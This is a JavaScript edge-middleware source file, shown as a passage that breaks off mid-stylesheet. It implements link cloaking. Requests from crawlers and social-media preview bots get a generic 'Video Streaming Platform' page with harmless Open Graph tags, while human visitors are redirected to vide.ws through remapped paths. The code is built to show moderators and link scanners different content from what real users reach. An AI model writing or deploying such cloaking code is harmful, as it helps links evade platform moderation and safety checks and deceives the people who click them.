export async function onRequest(context) {
  try {
    const { request } = context;
    const url = new URL(request.url);
    const path = url.pathname;
    const host = request.headers.get('host');
    
    console.log(`📨 Incoming request: ${path} from ${host}`);

    // Enhanced Bot Detection
    const isBot = detectBot(request);
    
    console.log(`🤖 Bot detection: ${isBot} for path: ${path}`);

    if (isBot) {
      return serveSafeContent(path, host);
    } else {
      return serveRedirectContent(path, host);
    }
  } catch (error) {
    console.error('❌ Error in middleware:', error);
    return new Response('Internal Server Error', { 
      status: 500,
      headers: { 'Content-Type': 'text/html' }
    });
  }
}

// ===== BOT DETECTION =====
function detectBot(request) {
  try {
    const userAgent = request.headers.get('user-agent') || '';
    const accept = request.headers.get('accept') || '';
    const acceptLanguage = request.headers.get('accept-language') || '';
    
    // Bot patterns
    const botPatterns = [
      /bot/i, /crawler/i, /spider/i, /monitoring/i,
      /Twitterbot/i, /facebookexternalhit/i, /WhatsApp/i,
      /TelegramBot/i, /Discordbot/i, /Slackbot/i,
      /Googlebot/i, /Bingbot/i, /YandexBot/i, /DuckDuckBot/i
    ];
    
    // Check bot patterns
    const isBotByUA = botPatterns.some(pattern => pattern.test(userAgent));
    
    // Additional signals
    const hasNoAcceptLanguage = !acceptLanguage;
    const hasSimpleAccept = accept.includes('*/*');
    
    return isBotByUA || (hasNoAcceptLanguage && hasSimpleAccept);
  } catch (error) {
    console.error('Error in bot detection:', error);
    return false;
  }
}

// ===== PATH MAPPING =====
function getTargetPath(sourcePath) {
  const pathMappings = {
    '/d/': '/e/',
    '/f/': '/f/', 
    '/v/': '/d/',
    '/s/': '/c/',
    '/p/': '/a/',
    '/w/': '/b/',
    '/x/': '/g/',
    '/y/': '/h/',
    '/z/': '/i/'
  };
  
  // Handle root path
  if (sourcePath === '/' || sourcePath === '') {
    return 'https://vide.ws/';
  }
  
  // Find matching base path
  for (const [sourceBase, targetBase] of Object.entries(pathMappings)) {
    if (sourcePath.startsWith(sourceBase)) {
      const remainingPath = sourcePath.slice(sourceBase.length);
      return `https://vide.ws${targetBase}${remainingPath}`;
    }
  }
  
  // Default fallback
  return `https://vide.ws${sourcePath}`;
}

// ===== SAFE CONTENT (FOR BOTS) =====
function serveSafeContent(path, host) {
  try {
    const pathId = path === '/' ? 'home' : path.split('/').pop() || 'content';
    
    const safeHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Streaming Platform - Premium Content</title>
    <meta name="description" content="Watch high-quality video content in HD. Our platform offers the best streaming experience.">
    
    <!-- Open Graph Meta Tags -->
    <meta property="og:url" content="https://${host}${path}">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Premium Video Content - Streaming Platform">
    <meta property="og:description" content="Watch exclusive video content in high definition">
    <meta property="og:image" content="https://via.placeholder.com/1200x630/667eea/ffffff?text=Video+Stream">
    
    <!-- Twitter Meta Tags -->
    <meta name="twitter:card" content="summary_large_image">
    <meta property="twitter:domain" content="${host}">
    <meta property="twitter:url" content="https://${host}${path}">
    <meta name="twitter:title" content="Video Streaming Platform">
    <meta name="twitter:description" content="Watch amazing video content in HD quality">
    <meta name="twitter:image" content="https://via.placeholder.com/1200x630/667eea/ffffff?text=Watch+Now">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display
